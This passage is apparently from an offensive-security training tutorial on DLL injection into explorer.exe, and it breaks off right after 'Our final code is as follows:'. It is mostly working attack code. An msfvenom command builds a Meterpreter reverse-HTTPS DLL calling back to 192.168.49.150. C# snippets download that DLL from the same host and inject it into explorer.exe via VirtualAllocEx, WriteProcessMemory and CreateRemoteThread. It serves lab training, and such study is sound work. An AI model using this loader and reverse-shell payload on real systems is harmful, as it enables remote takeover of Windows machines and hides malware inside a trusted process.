## Practical
We start by generating a dll with msfvenom:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.150 LPORT=443 -f dll -o /var/www/html/met.dll
```
And then start a ConsoleApp project in Visual Studio.

We will start the code by writing the DLL to disk because _LoadLibrary_ only accepts files present on disk.
The code to save the dll on disk and getting it's path is as follows:
```C#
using System.Net;

String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
String dllName = dir + "\\met.dll";

WebClient wc = new WebClient();
wc.DownloadFile("http://192.168.49.150/met.dll", dllName);
```

Next, we'll resolve the process ID of explorer.exe and pass it to _OpenProcess_:
```c#
Process[] expProc = Process.GetProcessesByName("explorer");
int pid = expProc[0].Id;

IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
```

As usual, we use _VirtualAllocEx_ to allocate memory in the remote process that is readable and writable and then use _WriteProcessMemory_ to copy the path and name of the DLL into it:
```C#
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);

IntPtr outSize;
Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
```

We will now resolve the base address of _LoadLibraryA_ inside the remote process.
This is easy as most native Windows DLLs are located at the same base address across processes, thus the address of our _LoadLibraryA_ API will be the same even in the remote process.

To locate the address, we'll use a combination of _GetModuleHandle_ and _GetProcAddress_.
```C#
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
```

Finally, we can invoke _CreateRemoteThread_, this time supplying both a starting address and an argument address:

```C#
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
```

Our final code is as follows:
